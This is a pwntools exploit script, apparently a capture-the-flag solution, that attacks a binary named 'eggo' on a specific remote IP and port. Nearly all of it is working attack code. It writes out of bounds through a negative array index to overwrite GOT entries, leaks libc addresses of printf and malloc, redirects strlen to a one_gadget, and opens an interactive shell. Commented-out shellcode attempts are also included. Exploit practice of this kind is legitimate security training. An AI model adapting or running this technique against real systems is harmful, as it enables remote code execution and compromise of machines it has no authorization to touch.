#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 46.101.107.117 --port 2208 ./eggo
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./eggo')
libc = ELF('./libc-2.33.so')

# gadgets from running one_gadget ./libc-2.33.so
gadgets = [0xcb5ca, 0xcb5cd, 0xcb5d0]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '46.101.107.117'
port = int(args.PORT or 2208)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
 
def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# first allocate memory for egg 0,1,2
eggsize = 64
if eggsize % 8 != 0:
    bufsize = eggsize+8
else:
    bufsize = eggsize+16

io.recvuntil(b'> ')
io.sendline(b'1\n%d'%eggsize)
print(io.recvline())

# # create shellcode, then edit egg 0
# sc = asm('nop;'*16 + shellcraft.amd64.linux.sh())
# sc = shellcraft.amd64.linux.sh()
# sc = shellcraft.pushstr('/bin/sh')
# sc += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)
# payload = bytes(asm(sc))

# log.info(f'shellcode = {sc}\n')
# log.info(f'payload = {payload}\n')
# io.sendline(b'4\n0')
# outF.write(b'4\n0\n')
# io.sendline(payload)
# outF.write(payload + b'\n')
# print(io.recvline())

# use a negative egg to re-direct strlen to printf by writing to the GOT
address_of_printf_got = 0x400730  # at 0x400730 the value is 0x404048 
address_of_strlen_got = 0x4006e8
address_of_malloc_got = 0x400760

diff = (address_of_strlen_got - exe.sym.eggs) // 8
printf_plt = 0x4010a6

log.info(f'printf_plt: {hex(printf_plt)}\n')
log.info(f'printf at plt + 6: {hex(exe.plt.printf+6)}\n')

log.info(f'use egg {diff}')
io.sendline(b'4\n%d'%diff)
io.sendline(p64(printf_plt))
print(io.recvline())

# leak the address of printf
log.info(f'address of eggs: {hex(exe.sym.eggs)}')
# diff = (exe.got["printf"] - exe.sym.eggs) // 8 
# diff = (exe.plt["printf"] - exe.sym.eggs) // 8 
# log.info(f'diff = {diff}\n')
diff = (address_of_printf_got - exe.sym.eggs) // 8 
# log.info(f'diff = {diff}\n')
# log.info(f'printf plt at {hex(exe.plt["printf"])}\n')
# log.info(f'target for printf {hex(exe.sym.eggs + diff * 8)}\n')

io.recvuntil(b'> ')
log.info('reading the address from printf@plt')
io.sendline(b'3\n%d'%diff)
addr = io.recvn(6) + b'\x00\x00'
log.info(f"received address {hex(u64(addr))}")
addr_printf = u64(addr)

# now leak address of malloc
diff = (address_of_malloc_got - exe.sym.eggs) // 8 
log.info(f'malloc at : {hex(exe.plt.malloc)}\n')
io.recvuntil(b'> ')
log.info('reading the address from malloc@plt')
io.sendline(b'3\n%d'%diff)
addr = io.recvn(6) + b'\x00\x00'
log.info(f"received address {hex(u64(addr))}")
addr_malloc = u64(addr)
log.info(f'diff prinf - malloc from run: {addr_printf-addr_malloc}')

# now re-direct strlen to a gadget
diff = (address_of_strlen_got - exe.sym.eggs) // 8
addr_gadget = addr_printf - libc.sym.printf + gadgets[2]
print(f'gadget in libc: {hex(addr_gadget)}')
io.recvuntil(b'> ')
io.sendline(b'4\n%d'%diff)
io.sendline(p64(addr_gadget))

io.interactive()

